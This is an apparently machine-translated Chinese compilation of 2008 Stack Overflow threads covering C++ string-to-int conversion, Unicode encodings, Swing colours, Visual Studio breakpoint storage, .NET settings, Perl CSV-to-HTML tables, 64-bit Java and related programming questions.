这将需要一个数据库和一些有趣的 SQL 查询。用于填写学生资料的网页。建议时间表的某种报告。如果您存储配置文件，那么您还需要身份验证。您可以在应用程序的不同区域独立工作。

让我们知道你决定做什么，以及你的部分成绩依赖其他程序员是什么感觉。祝你好运！

# c++ - 如何将 C++ 字符串转换为 int？

> ID：200090
> 
> 赞同：46
> 
> 时间：2008-10-14T05:35:29.567
> 
> 标签：c++, parsing, int, stdstring

> **可能重复：**
> [如何在 C++ 中将字符串解析为 int？](https://stackoverflow.com/questions/194465/how-to-parse-a-string-to-an-int-in-c)

如何将 C++ 字符串转换为 int？

假设您希望字符串中包含实际数字（例如，“1”、“345”、“38944”）。

另外，假设您没有 boost，并且您真的想以 C++ 方式进行，而不是使用笨拙的旧 C 方式。

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2008-10-14T05:44:55.510

```
#include <sstream>

// st is input string
int result;
stringstream(st) >> result; 
```

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2008-10-14T05:37:08.567

使用 C++ 流。

```
std::string       plop("123");
std::stringstream str(plop);
int x;

str >> x;

/* Lets not forget to error checking */
if (!str)
{
     // The conversion failed.
     // Need to do something here.
     // Maybe throw an exception
} 
```

PS。这个基本原则就是 boost 库的`lexical_cast<>`工作原理。

我最喜欢的方法是boost`lexical_cast<>`

```
#include <boost/lexical_cast.hpp>

int x = boost::lexical_cast<int>("123"); 
```

它提供了一种在字符串和数字格式之间转换并再次转换回来的方法。在它下面使用字符串流，因此可以将任何可以编组为流然后从流中解组的内容（查看 >> 和 << 运算符）。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-15T17:45:41.730

C++ 常见问题解答精简版

[39.2] 如何将 std::string 转换为数字？

[https://isocpp.org/wiki/faq/misc-technical-issues#convert-string-to-num](https://isocpp.org/wiki/faq/misc-technical-issues#convert-string-to-num)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T05:48:54.470

我之前在 C++ 代码中使用过类似以下的内容：

```
#include <sstream>
int main()
{
    char* str = "1234";
    std::stringstream s_str( str );
    int i;
    s_str >> i;
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-11-20T00:54:01.660

让我添加我对 boost::lexical_cast 的投票

```
#include <boost/lexical_cast.hpp>

int val = boost::lexical_cast<int>(strval) ; 
```

它会引发`bad_lexical_cast`错误。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T11:57:57.753

也许我误解了这个问题，你为什么*不想*使用**atoi**？我认为重新发明轮子没有意义。

我只是在这里错过了重点吗？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T05:39:44.130

使用[atoi](http://www.cplusplus.com/reference/clibrary/cstdlib/atoi.html)

* * *

## 回答 #8

> 赞同：-6
> 
> 时间：2008-10-14T05:45:58.550

在“stdapi.h”中

```
StrToInt 
```

这个函数告诉你结果，以及有多少字符参与了转换。

# c++ - C++ 代码中的 UTF 用法

> ID：200093
> 
> 赞同：6
> 
> 时间：2008-10-14T05:36:21.330
> 
> 标签：c++, unicode, locale, utf, ucs

UTF 和 UCS 有什么区别。

在 C++ 字符串中表示非欧洲字符集（使用 UTF）的最佳方法是什么。我想知道您对以下方面的建议：

*   代码内部的表示
    *   用于运行时的字符串操作
    *   用于将字符串用于显示目的。
*   最佳存储表示（**即**在文件中）
*   最佳有线传输格式（在可能位于不同架构且具有不同标准语言环境的应用程序之间传输）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-14T06:17:45.723

> UTF 和 UCS 有什么区别。

UCS 编码是固定宽度的，并以每个字符使用多少字节来标记。例如，UCS-2 每个字符需要 2 个字节。代码点超出可用范围的字符无法在 UCS 编码中进行编码。

UTF 编码是可变宽度的，并由存储字符的最小位数标记。例如，UTF-16 要求每个字符至少 16 位（2 个字节）。具有大代码点的字符使用大量字节进行编码——UTF-16 中的星体字符为 4 个字节。

> *   代码内部的表示
> *   最佳存储表示（即在文件中）
> *   最佳有线传输格式（在可能位于不同架构且具有不同标准语言环境的应用程序之间传输）

对于现代系统，最合理的存储和传输编码是 UTF-8。在某些特殊情况下，其他可能是合适的——UTF-7 用于旧邮件服务器，UTF-16 用于编写不佳的文本编辑器——但 UTF-8 是最常见的。

首选的内部代表将取决于您的平台。在 Windows 中，它是 UTF-16。在 UNIX 中，它是 UCS-4。每个都有其优点：

*   UTF-16 字符串永远不会比 UCS-4 字符串使用更多的内存。如果您主要在基本多语言平面 (BMP) 中存储许多带有字符的大字符串，则 UTF-16 需要的空间比 UCS-4 少得多。在 BMP 之外，它将使用相同的数量。
*   UCS-4 更容易推理。由于 UTF-16 字符可能会被拆分为多个“代理对”，因此正确拆分或呈现字符串可能具有挑战性。UCS-4 文本没有这个问题。UCS-4 的行为也很像“char”数组中的 ASCII 文本，因此可以轻松移植现有的文本算法。

最后，一些系统使用 UTF-8 作为内部格式。如果您需要与现有的基于 ASCII 或 ISO-8859 的系统进行互操作，这很好，因为 UTF-8 文本中间不存在 NULL 字节——它们在 UTF-16 或 UCS-4 中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T05:46:34.070

您是否阅读过 Joel Spolsky 关于[每个软件开发人员绝对、肯定必须了解 Unicode 和字符集（没有任何借口！）](http://www.joelonsoftware.com/articles/Unicode.html)的文章？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T05:42:55.340

我会建议：

*   用于代码`wchar_t`或等效的表示。
*   对于存储表示，UTF-8。
*   对于电线表示，UTF-8。

UTF-8 在存储和有线情况下的优势在于机器字节序不是一个因素。使用固定大小的字符（例如`wchar_t`在代码中）的优点是您可以轻松找出字符串的长度，而无需扫描它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T05:42:42.550

UTC 是协调世界时，而不是字符集（我没有找到任何称为 UTC 的字符集）。

对于内部表示，您可能希望使用`wchar_t`每个字符，而 std::wstring 用于字符串。它们为每个字符使用 2 个字节，因此查找和随机访问会很快。

对于存储，如果大部分数据不是 ASCII（即代码 >= 128），您可能希望使用 UTF-16，它与序列化`wstring`和`wchar_t`.

由于 UTF-16 可以是小端或大端，对于有线传输，请尝试将其转换为与体系结构无关的 UTF-8。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T07:02:07.443

在代码内部的表示中，您最好对欧洲和非欧洲字符执行此操作：

\uNNNN

在 \u0020 到 \u007E 范围内的字符和一点点空格（例如行尾）可以写成普通字符。\u0080 以上的任何内容，如果您将其编写为普通字符，则它将仅在您的代码页中编译（例如，在法国可以但在俄罗斯中断，在俄罗斯可以但在日本中断，在中国可以但在美国中断，等等.)。

# java - Java-改变摇摆背景颜色？

> ID：200106
> 
> 赞同：2
> 
> 时间：2008-10-14T05:44:29.317
> 
> 标签：java, swing, colors, background

好的，所以我有一个使用“系统”外观和感觉的摇摆应用程序。现在，我想将主面板的背景颜色更改为黑色。太容易了吧？

```
UIManager.put("Panel.background", Color.BLACK); 
```

嗯，是的，除了现在应用程序中的控件看起来很愚蠢，因为它们的“阴影”，因为想要一个更好的词，逐渐淡化为旧系统默认颜色（总窗户灰色）。所以所有控件上都有浅灰色的“角”，尤其是 JTabbedPane 上的选项卡。我知道它可以修复，因为如果您将 windowsXP 主题更改为具有不同默认应用程序颜色的主题，控件将采用这种更改后的颜色，并且它们的阴影会向它“淡化”。

但我不知道它是什么 UIManager 键，或者即使你可以用 UIManger 来做。

我真的不想改变 L&F 引擎，因为除此之外它看起来还不错。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-16T20:01:35.857

一般来说，这有点棘手。这取决于您使用的确切 LaF。

例如。JGoodies 使用自己的配色方案重新定义了这些东西。

通常，属性名称的组成如下

```
COMPONENT_NAME_WITHOUT_J + '.' + PROPERTY. 
```

不幸的是，属性名称只能从 LaF 的实现类中获得。这些不是共享的或其他的。每个组件都有自己的。或者更好的是，这取决于作者的懒惰他使用了哪些配对。一般来说。

很多帮助使得重新定义 Panel.* 和 Button。*. 很多组件都使用 Button。*特性。

尝试，玩，赢:)。祝你好运 ：）。

PS：要覆盖的属性很多。但这就是 LaFs 的工作方式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T06:08:49.593

你可以试试这些：

*   控制
*   控制DkShadow
*   控制高亮
*   controlLt高亮
*   控制阴影

（我刚刚在这个列表中找到它们：[Swing [Archive] - UIManager: setting background and JScrollBar](http://forums.sun.com/thread.jspa?threadID=183858&forumID=57)）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T05:56:24.330

您可以使用 UIManager.getDefaults(); 查看默认设置（及其键）。然后，您可以遍历生成的 keySet（它是 Map 的一个实例）。

所以像这样的东西会显示所有的默认键：

```
for (Object key: UIManager.getDefaults().keySet())
{
    System.out.println(key);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-10-29T00:38:42.547

像 JButton 这样的一些控件需要`setOpaque(false)`调用以允许新的背景颜色淡出。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-05-19T04:40:55.470

要列出我们可以设置为 UIManager 以更改 LaF 的所有可能选项，请运行以下代码........

```
 import java.util.*;
  import javax.swing.UIManager;

  public class UIManager_All_Put_Options
  {
    public static void main (String[] args)
    {
      Hashtable   properties = UIManager.getDefaults();
      Enumeration keys       = properties.keys();

      while (keys.hasMoreElements()) {
        String key   = (String) keys.nextElement();
        Object value = properties.get (key);
        System.out.printf("%-40s \t %-200s \n", key,value);
      }
    }
  } 
```

请享用...

# visual-studio - Visual Studio 断点保存在哪里？

> ID：200114
> 
> 赞同：56
> 
> 时间：2008-10-14T05:48:24.440
> 
> 标签：visual-studio, breakpoints

在检查代码时，我似乎从其他程序员那里得到了断点......

Visual Studio 保存的断点列表在哪里？在 vbproj 文件中？vbproj.user 文件？文件和设置？它们是否意味着特定于解决方案、项目、用户、它们所在的计算机？

谢谢！

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2008-10-14T05:53:24.743

它们保存在 <solutionname>.suo 文件中。SUO 代表解决方案用户选项，不应添加到源代码管理中。

没有 .vbproj.user 文件也应该在源代码管理中！

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2016-03-01T22:48:55.513

从 Visual Studio 2015 开始，CTP 解决方案和项目相关文件存储在 .vs 目录中。对于 Visual Studio 2015，suo 文件的路径是 .vs\<SolutionName>\v14\.suo。

# .net - 下次如何加载动态创建的设置属性？

> ID：200124
> 
> 赞同：5
> 
> 时间：2008-10-14T05:52:19.940
> 
> 标签：.net, app-config, system.configuration

我创建了一种动态添加`SettingsProperty`到 .NET`app.config`文件的方法。这一切都很好，但是当我下次启动我的应用程序时，我只能看到在设计器中创建的属性。如何加载属性运行时？

我的创建代码`SettingsProperty`如下所示：

```
internal void CreateProperty<T>(string propertyName)
{
    string providerName = "LocalFileSettingsProvider";
    System.Configuration.SettingsAttributeDictionary attributes = new SettingsAttributeDictionary();
    System.Configuration.UserScopedSettingAttribute attr = new UserScopedSettingAttribute();

    attributes.Add(attr.TypeId, attr);

    System.Configuration.SettingsProperty prop;
    SettingsProvider provider = ApplicationEnvironment.GlobalSettings.Providers[providerName];

    prop = new System.Configuration.SettingsProperty(
        propertyName,
        typeof(T),
        provider,
        false,
        default(T),
        System.Configuration.SettingsSerializeAs.String,
        attributes,
        false,
        false
    );

    ApplicationEnvironment.GlobalSettings.Properties.Add(prop);
    ApplicationEnvironment.GlobalSettings.Reload(); 
} 
```

下次运行时，我要求设置属性，但找不到之前创建的任何属性。不管我是否打电话`ApplicationEnvironment.GlobalSettings.Reload();`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-08-30T06:45:29.177

用户定义的配置设置与创建它们的程序集版本相关联。如果您有滚动版本号（例如 1.0.. *）*，您将丢失上次运行的设置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-01-31T13:01:04.017

我遇到了同样的问题。恕我直言，问题在于 .NET`System.Configuration.SettingsBase`对象使用反射来确定应从持久存储中加载的属性的名称、类型等。当您添加动态设置属性时，此信息将丢失。因此，您不仅需要在*保存*值之前添加设置属性定义，还需要在*阅读*之前添加。在你的情况下，它应该是这样的

```
...
// the name and type of the property being read must be known at this point
CreateProperty<T>( propertyName );
ApplicationEnvironment.GlobalSettings.Reload();
T propertyValue = ApplicationEnvironment.GlobalSettings[propertyName]; 
```

您可能希望`CreateProperty`在开始时为要使用的所有属性调用该方法，然后`Reload`只调用一次。在这两种情况下，您都需要知道属性的名称和类型。

# html - 如何使用 Perl 将 CSV 转换为 HTML 表格？

> ID：200140
> 
> 赞同：0
> 
> 时间：2008-10-14T06:04:34.207
> 
> 标签：html, perl, html-table

在我的代码中，我想以表格形式查看 CSV 中的所有数据，但它只显示最后一行。1号线和2号线呢？这是数据：

```
1,HF6,08-Oct-08,34:22:13,df,jhj,fh,fh,ffgh,gh,g,rt,ffgsaf,asdf,dd,yoawa,DWP,tester,Pattern
2,hf35,08-Oct-08,34:12:13,dg,jh,fh,fgh,fgh,gh,gfh,re,fsaf,asdf,dd,yokogawa,DWP,DWP,Pattern
3,hf35,08-Oct-08,31:22:03,dg,jh,fh,fgh,gh,gh,gh,rte,ffgsaf,asdf,dfffd,yokogawa,DWP,DWP,ghh 
```

这是代码：

```
#! /usr/bin/perl
print "Content-type:text/html\r\n\r\n";
use CGI qw(:standard);
use strict;
use warnings;

my $line;
my $file;
my ($f1,$f2,$f3,$f4,$f5,$f6,$f7,$f8,$f9,$f10,$f11,$f12,$f13,$f14,$f15,$f16,$f17,$f18,$f19);

$file='MyFile.txt';
open(F,$file)||die("Could not open $file");
while ($line=<F>)
{

($f1,$f2,$f3,$f4,$f5,$f6,$f7,$f8,$f9,$f10,$f11,$f12,$f13,$f14,$f15,$f16,$f17,$f18,$f19)= split ',',$line;

}

close(F);

print "<HTML>";
print "<head>";
print "<body bgcolor='#4682B4'>";
print "<title>FUSION SHIFT REPORT</title>";
print "<div align='left'>";
print "<TABLE CELLPADDING='1' CELLSPACING='1' BORDER='1' bordercolor=black width='100%'>";
print "<TR>";
print "<td width='12%'bgcolor='#00ff00'><font size='2'>RECORD No.</td>";
print "<td width='12%'bgcolor='#00ff00'><font size='2'>TESTER No.</td>";
print "<td width='12%'bgcolor='#00ff00'><font size='2'>DATE</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>TIME</td>";
print "<td width='11%'bgcolor='#00ff00'><font size='2'>DEVICE NAME</td>";
print "<td bgcolor='#00ff00'><font size='2'>TEST PROGRAM</td>";
print "<td bgcolor='#00ff00'><font size='2'>DEVICE FAMILY</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>SMSLOT</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>DIE LOT</td>";
print "<td width='12%'bgcolor='#00ff00'><font size='2'>LOADBOARD</td>";
print "<td width='12%'bgcolor='#00ff00'><font size='2'>TESTER </td>";
print "<td width='12%'bgcolor='#00ff00'><font size='2'>SERIAL NUMBER</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>TESTER CONFIG</td>";
print "<td width='11%'bgcolor='#00ff00'><font size='2'>SMSLOT</td>";
print "<td bgcolor='#00ff00'><font size='2'>PACKAGE</td>";
print "<td bgcolor='#00ff00'><font size='2'>SOCKET</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>ROOT CAUSE 1</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>ROOT CAUSE 2</td>";
print "<td width='13%'bgcolor='#00ff00'><font size='2'>ROOT CAUSE 3</td>";
print "</tr>";
print "<TR>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f1</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f2</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f3</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f4</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f5</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f6</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f7</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f8</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f9</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f10</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f11</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f12</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f13</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f14</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f15</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f16</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f17</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f18</TD>";
print "<TD bgcolor='#ADD8E6'><font size='2'>$f19</TD>";
print "</tr>";

print "</TABLE>";

print "</body>";
print "<html>"; 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-14T06:30:25.963

您需要在 while 循环*内*输出表格行，因为那是您读取行的地方。

所以更改代码，使其

*   输出表头
*   逐行读取文件输出表行
*   输出表格页脚

如果稍微简化一下，这就是您的循环的外观...

```
while ($line=<F>)
{  
    print "<tr>";
    my @cells= split ',',$line;
    foreach my $cell (@cells)
    {
       print "<td>$cell</td>";
    }
    print "</tr>";
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-14T15:58:48.937

HTML::Template 会让你的生活更轻松。这是我使用精简模板的方法。

```
#!/usr/local/bin/perl

use strict;
use warnings;

use HTML::Template;

my @table;
while (my $line = <DATA>){
    chomp $line;
    my @row = map{{cell => $_}} split(/,/, $line);
    push @table, {row => \@row};
}

my $tmpl = HTML::Template->new(scalarref => \get_tmpl());
$tmpl->param(table => \@table);
print $tmpl->output;

sub get_tmpl{
    return <<TMPL
<html>
<TMPL_LOOP table>
<tr>
<TMPL_LOOP row>
<td><TMPL_VAR cell></td></TMPL_LOOP>
</tr></TMPL_LOOP>
</html>
TMPL
}

__DATA__
1,HF6,08-Oct-08,34:22:13,df,jhj,fh,fh,ffgh,gh,g,rt,ffgsaf,asdf,dd,yoawa,DWP,tester,Pattern
2,hf35,08-Oct-08,34:12:13,dg,jh,fh,fgh,fgh,gh,gfh,re,fsaf,asdf,dd,yokogawa,DWP,DWP,Pattern
3,hf35,08-Oct-08,31:22:03,dg,jh,fh,fgh,gh,gh,gh,rte,ffgsaf,asdf,dfffd,yokogawa,DWP,DWP,ghh 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-15T01:39:48.513

```
$f1,$f2,$f3,$f4 
```

任何时候你看到这样的代码都应该响起警钟。使用数组。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-14T06:28:50.787

请允许我用一个更小的例子来演示。

```
my $f;
while ($line = <F>) {
    $f = $line;
}
print $f; 
```

上面的代码将读取文件 F 的每一行，并将每一行分配给变量`$f`。每次它分配一个新行时，前一行都会被覆盖。当它到达文件末尾时，它会打印出`$f`一次的值。

```
my $f;
while ($line = <F>) {
    $f = $line;
    print $f;
} 
```

上面的代码有`print`内部循环，因此`print`将针对输入的每一行运行。您将需要对您的代码进行类似的修改以获得您期望的输出。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T15:54:51.800

您只看到最后一行的原因是您在读取整个文件后运行打印并在读取下一行时丢弃每一行。

老实说，该代码存在各种问题。我将提到几个并在下面的代码片段中解决这些问题。

1.  不要自己解析 CSV 数据（拆分）。使用[Text::CSV](http://search.cpan.org/perldoc?Text::CSV)或 -- 如果您需要更好的性能 -- [Text::CSV_XS](http://search.cpan.org/perldoc?Text::CSV_XS)。
2.  您的 HTML 无效。您不会关闭所有标签，特别是标题应该在头部，而不是正文。
3.  您应该使用模板模块将表格数据插入网页。示例：[HTML::Template](http://search.cpan.org/perldoc?HTML::Template)或[Template Toolkit](http://search.cpan.org/perldoc?Template)。
4.  至少，使用函数来抽象出冗余代码。
5.  更好的是，使用数据的格式也是数据的事实。这就是为什么它应该被这样对待。
6.  如果你发现你声明了很多带有数字的变量（`$f1`, `$f2`,...），你真的想要一个数组：`@fields = split /,/, $line;`

* * *

```
use strict;
use warnings;
use CGI qw();
use Text::CSV;

my $cgi = CGI->new();
print $cgi->header();

my $file ='MyFile.txt';

# should really use a templating module from CPAN,
# but let's take it step by step.
# Any of the following would fit nicely:
# - Template.pm (Template Toolkit)
# - HTML::Template, etc.
my $startHtml = <<'HERE';
<html>
<head> <title>FUSION SHIFT REPORT</title> </head>
<body bgcolor="#4682B4">
<div align="left">
<table cellpadding="1" cellspacing="1" border="1" bordercolor="black" width="100%">
HERE
my $endHtml = <<'HERE';

</table>

</body>
<html>
HERE

my @columns = (
  { name => 'RECORD No.', width => 12 },
  { name => 'TESTER No.', width => 12 },
  { name => 'DATE', width => 12 },
  { name => 'TIME', width => 13 },
  { name => 'DEVICE NAME', width => 11 },
  { name => 'TEST PROGRAM' },
  { name => 'DEVICE FAMILY' },
  { name => 'SMSLOT', width => 13 },
  { name => 'DIE LOT', width => 13 },
  { name => 'LOADBOARD', width => 12 },
  { name => 'TESTER', width => 12 },
  { name => 'SERIAL NUMBER', width => 12 },
  { name => 'TESTER CONFIG', width => 13 },
  { name => 'SMSLOT', width => 11 },
  { name => 'PACKAGE' },
  { name => 'SOCKET' },
  { name => 'ROOT CAUSE 1', width => 13 },
  { name => 'ROOT CAUSE 2', width => 13 },
  { name => 'ROOT CAUSE 3', width => 13 },
);

my $csv = Text::CSV->new();
open my $fh, '<', $file
  or die "Could not open file '$file': $!"; # should generate a HTML error here

# print header
print $startHtml;
print_table_header(\@columns);

while (defined(my $line = <$fh>)) {
  $csv->parse($line);
  # watch out: This may be "tainted" data!
  my @fields = $csv->fields();
  @fields = @fields[0..$#columns] if @fields > @columns;
  print_table_line(\@fields);
}

close $fh;

print $endHtml;

sub print_table_header {
  my $columns = shift;
  print "<tr>\n";
  foreach my $column (@$columns) {
    my $widthStr = (defined($column->{width}) ? ' width="'.$column->{width}.'"' : '');
    my $colName = $column->{name};
    print qq{<td$widthStr bgcolor="#00FF00"><font size="2">$colName</font></td>\n};
  }
  print "</tr>\n";
}

sub print_table_line {
  my $fields = shift;
  print "<tr>\n";
  foreach my $field (@$fields) {
    print qq{<td bgcolor=\"#ADD8E6\"><font size="2">$field</font></td>\n};
  }
  print "</tr>\n";
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T22:39:57.190

请关闭您的 <font> 标签。仅仅因为浏览器会处理它们的缺失并不意味着它们没有价值。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-05-28T14:44:15.937

这不是最强大的解决方案，事实上，如果您的值中有逗号，则会出现一些非常讨厌的失败，但它为我完成了这项工作：

（CSV 数据位于名为 $content 的变量中）

```
$content =~ s#\n#</td></tr><tr><td>#g;
$content =~ s#,#</td><td>#g;
$content = "<table><tr><td>$content</td></tr></table>"; 
```

# java - 64 位 Java 平台的优势

> ID：200147
> 
> 赞同：13
> 
> 时间：2008-10-14T06:09:09.500
> 
> 标签：java, 64-bit

我是 java 平台的绝对 n00b 我想知道我是否需要更改我的代码中的任何内容以获得 64 位 JRE 的好处？

还是当我用“java -d64”启动它时它会以某种涡轮模式运行？

非常感谢您的帮助

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-14T10:57:14.863

我以前的版本，虽然不是假的，但很快就被过度简化了。

从 32 位更改为 64 位不会自动使您的应用程序运行得更快，在某些情况下可能会导致相反的结果。在“消极”方面，在 JVM 中取消引用内存指针可能需要比 32 位指针更长的时间，64 位指针。与 2 GB 堆相比，16 GB 堆的完整垃圾收集和压缩可能需要更长的时间。

积极的一面：64 位处理器指令比 32 位处理器指令更有效。64 位 JVM 将使您的堆大小比 32 位的 4 GB 大 2 ^ 32 倍，略小于 4 GB。（如果你买得起这么大的 RAM）如果你的堆大小小于 4 GB，一些 JVM 可以使用压缩引用，从而为你提供 64 位指令的优势，而无需支付 64 位取消引用的价格。

如果你有一个好的 JVM，无论堆大小如何，我都会使用 64 位，只是准备好你可能不得不为拥有一个非常大的堆而遭受性能损失。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-07-24T11:46:24.023

我认为 64 位 JVM 不会获得应用程序的性能吗？如何？

事实上 64 位处理器有点慢。它们具有更复杂的解码管道（向后支持 32 位操作）。他们需要更多的内存吞吐量（所有指针都是双倍大小的，对吧？）。您在 64 位处理器上唯一拥有的是大量 RAM。正如我们所知，大小就是速度。大量的 RAM 可以很好地提高某些应用程序的性能（如果应用程序可以使用它）。所以 64 位 - 不。大量的内存——绝对是的。

还有一件事是 64 位处理器可以做得更快。64 位数字的原子写入/读取。如果您使用 64 位数字（在 java 中为 long），则 64 位处理器会更好，因为它们具有处理此类数字的机器 CAS 指令。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-14T06:25:27.033

不，你不需要改变任何东西。使用 64 位没有固有的好处。事实上，它会使您的程序在内存中更大，因为所有指针都将变为 64 位宽而不是 32 位宽。

唯一的优势是当您进行 64 位计算时，例如在您的代码中使用大量“长整数”或者您的应用程序需要超过 4gb 的内存。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-14T06:17:27.767

因为执行代码的 JVM 的行为应该相同（整数始终是 32 位签名等），所以无论您运行什么平台，都可以保证（理论上）您的代码运行相同。

32/64 位的区别在于 JVM 如何优化运行时。因此，虽然执行的字节码保持不变，但它可能（或可能不会）以不同的方式进行优化。

简而言之，运行 Java 的 64 位系统执行代码的速度可能比等效的 32 位系统更快。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T06:11:02.740

你不应该改变什么。与 C 或 C++ 不同，Java 为其编写了一个规范，以确保无论您在什么平台上，int（和其他数据类型）的长度始终相同。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-07-24T13:25:44.597

您的应用程序代码中有任何 JNI 吗？那么也许您需要担心 32 位与 64 位本机二进制文件。

32 或 64 对您的 Java 代码都是一样的。以前的海报似乎已经很好地涵盖了性能方面。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-14T06:14:18.243

是的，你不需要改变任何东西。不同的是 JRE，而不是您编写的代码。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-01-27T22:02:05.763

尝试这个：

```
public class Benchmark {
public static void main(String args[]) {
long time = System.currentTimeMillis();
for (int a = 1; a < 900000000; a++) {
    for (int b = 1; b < 20; b++) {
    }
}
long time2 = System.currentTimeMillis() - time;
System.out.println("\nTime counter stopped: " + time2); 
```

}

在 32 位和 64 位中，一笑置之。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-07-24T20:04:59.490

我发现 64 位 JVM 比 32 位版本慢。然而，在最新版本的 Java 6 update 14 中，我发现我的许多测试在 64 位版本上比 32 位版本稍微快一些。无论哪种方式，只有 5% 到 10% 的差异。

您的程序是使用 32 位还是 64 位版本取决于您使用的 JVM 的选择。如前所述，您需要检查是否有适当的共享库。（或理想情况下没有）

主要区别在于如果您需要 4 GB 或更多，则可以使用更多内存。

# logging - Apache commons httpclient - 禁用调试/降低调试级别

> ID：200150
> 
> 赞同：2
> 
> 时间：2008-10-14T06:10:31.243
> 
> 标签：logging, apache-commons-httpclient

我在 Lotus Notes Java 代理中使用 apache commons httpclient，它工作正常。但是在建立代理连接时，日志将包含以下行：

```
[INFO] AuthChallengeProcessor - basic authentication scheme selected 
```

您知道如何禁用集成日志记录或如何设置较低的调试级别吗？它是httpclient本身的“功能”，因此不需要我这边的代码:-)

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-10-14T06:44:39.007

您应该能够将日志记录级别设置为垃圾邮件较少的内容。有一些默认的[日志记录选项](http://hc.apache.org/httpclient-3.x/logging.html)，因此这取决于您选择的日志记录方法。

听起来您的日志记录级别设置为“调试”或“信息”，应设置为“通知”或更高（以避免信息和低于级别警告）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T07:09:58.690

我查看了身份验证 rfc 并读到这是警告不要使用基本身份验证。所以我认为我需要更改身份验证以不以可读文本提交登录信息。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-10-14T07:37:47.793

可以设置 AuthPolicy Priority ：

……截断……

```
client.getState().setProxyCredentials(
                            new AuthScope(conParm.getProxyServer(), conParm.getProxyPort()),
                            new UsernamePasswordCredentials(conParm.getProxyUser(), conParm.getProxyPw()));

    **ArrayList authPrefs = new ArrayList(2);
    authPrefs.add(AuthPolicy.DIGEST);
    authPrefs.add(AuthPolicy.BASIC);

                        client.getParams().setParameter(AuthPolicy.AUTH_SCHEME_PRIORITY, authPrefs);
                        client.getParams().setParameter("http.protocol.expect-continue", new Boolean(true));** 
```

..快照....

# vb.net - 在通用列表中搜索对象

> ID：200151
> 
> 赞同：14
> 
> 时间：2008-10-14T06:11:00.760
> 
> 标签：vb.net, generics

是否可以通过其在通用列表中的属性之一来搜索对象？

```
Public Class Customer

    Private _id As Integer

    Private _name As String

    Public Property ID() As Integer
        Get
            Return _id
        End Get
        Set
            _id = value
        End Set
    End Property

    Public Property Name() As String
        Get
            Return _name
        End Get
        Set
            _name = value
        End Set
    End Property

    Public Sub New(id As Integer, name As String)
        _id = id
        _name = name
    End Sub

End Class 
```

然后加载和搜索

```
Dim list as new list(Of Customer)

list.Add(New Customer(1,"A")

list.Add(New Customer(2,"B") 
```

如何返回 id = 1 的客户对象？这与泛型中的“谓词”有关吗？

注意：我在 VB.NET 中执行此操作。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2008-10-14T06:20:03.050

是的，这与谓词有关:)

